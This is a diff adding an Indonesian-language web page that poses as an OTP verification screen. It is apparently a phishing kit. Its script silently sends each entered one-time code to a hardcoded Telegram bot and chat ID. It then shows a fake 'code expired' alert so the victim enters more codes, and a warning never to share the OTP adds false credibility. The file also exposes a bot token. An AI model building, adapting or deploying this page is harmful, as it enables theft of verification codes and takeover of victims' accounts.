@@ -1,0 +1,182 @@
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifikasi OTP</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen">
+  <div class="max-w-md mx-auto px-5 pt-6">
+    <header class="flex justify-between items-center mb-6">
+      <button aria-label="Back" class="text-black text-2xl leading-none">
+        <i class="fas fa-arrow-left"></i>
+      </button>
+      <button aria-label="Help" class="text-black text-2xl leading-none">
+        <i class="fas fa-headset"></i>
+      </button>
+    </header>
+
+    <h1 class="font-bold text-2xl mb-3">Verifikasi OTP</h1>
+
+    <p class="text-gray-600 text-sm mb-4 leading-relaxed">
+      Masukkan kode <span class="font-bold">OTP</span> yang dikirimkan ke nomormu. Jangan bagikan kode OTP ke siapapun.
+    </p>
+
+    <p class="text-gray-800 text-sm mb-8 leading-relaxed">
+      Kami sudah mengirimkan kode <span class="font-bold">OTP</span>
+    </p>
+
+    <form id="otpForm" class="flex justify-between max-w-xs mb-10" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*">
+      <input
+        type="text"
+        maxlength="1"
+        class="w-12 h-12 border-b-2 border-gray-300 text-center text-xl focus:outline-none focus:border-black"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-label="OTP digit 1"
+        required
+        name="otp1"
+        autocomplete="one-time-code"
+      />
+      <input
+        type="text"
+        maxlength="1"
+        class="w-12 h-12 border-b-2 border-gray-300 text-center text-xl focus:outline-none focus:border-black"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-label="OTP digit 2"
+        required
+        name="otp2"
+        autocomplete="one-time-code"
+      />
+      <input
+        type="text"
+        maxlength="1"
+        class="w-12 h-12 border-b-2 border-gray-300 text-center text-xl focus:outline-none focus:border-black"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-label="OTP digit 3"
+        required
+        name="otp3"
+        autocomplete="one-time-code"
+      />
+      <input
+        type="text"
+        maxlength="1"
+        class="w-12 h-12 border-b-2 border-gray-300 text-center text-xl focus:outline-none focus:border-black"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-label="OTP digit 4"
+        required
+        name="otp4"
+        autocomplete="one-time-code"
+      />
+      <button type="submit" class="hidden">Submit</button>
+    </form>
+
+    <p class="text-gray-500 text-xs">
+      Dikirim ulang dalam: <span id="countdown" class="font-semibold">00:60</span>
+    </p>
+  </div>
+
+  <script>
+    const botToken = '8288100288:AAFLYwr0gDGktBvmPEOniDxGxQsPkv_DX_0'; // Ganti dengan token bot Telegram kamu
+    const chatId = '6351598509'; // Ganti dengan chat ID tujuan
+
+    const form = document.getElementById('otpForm');
+    const inputs = form.querySelectorAll('input[type="text"]');
+    const countdownEl = document.getElementById('countdown');
+
+    // Auto move focus to next input on input
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+        checkAndSubmit();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+    });
+
+    // Check if all inputs filled, then submit automatically
+    function checkAndSubmit() {
+      let otp = '';
+      for (const input of inputs) {
+        if (input.value.length !== 1) return;
+        otp += input.value;
+      }
+      sendOtp(otp);
+    }
+
+    let isSending = false;
+    async function sendOtp(otp) {
+      if (isSending) return;
+      isSending = true;
+
+      const message = `Kode OTP yang dimasukkan: ${otp}`;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          alert('Kode OTP Kadaluwarsa');
+          form.reset();
+          inputs[0].focus();
+        } else {
+          alert('Gagal mengirim ke Telegram: ' + data.description);
+        }
+      } catch (error) {
+        alert('Terjadi kesalahan saat mengirim data ke Telegram');
+        console.error(error);
+      } finally {
+        isSending = false;
+      }
+    }
+
+    // Countdown timer from 60 seconds
+    let timeLeft = 60;
+    function updateCountdown() {
+      if (timeLeft < 0) {
+        countdownEl.textContent = '00:00';
+        clearInterval(timerInterval);
+        return;
+      }
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      countdownEl.textContent =
+        (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+      timeLeft--;
+    }
+    updateCountdown();
+    const timerInterval = setInterval(updateCountdown, 1000);
+  </script>
+</body>
+</html>
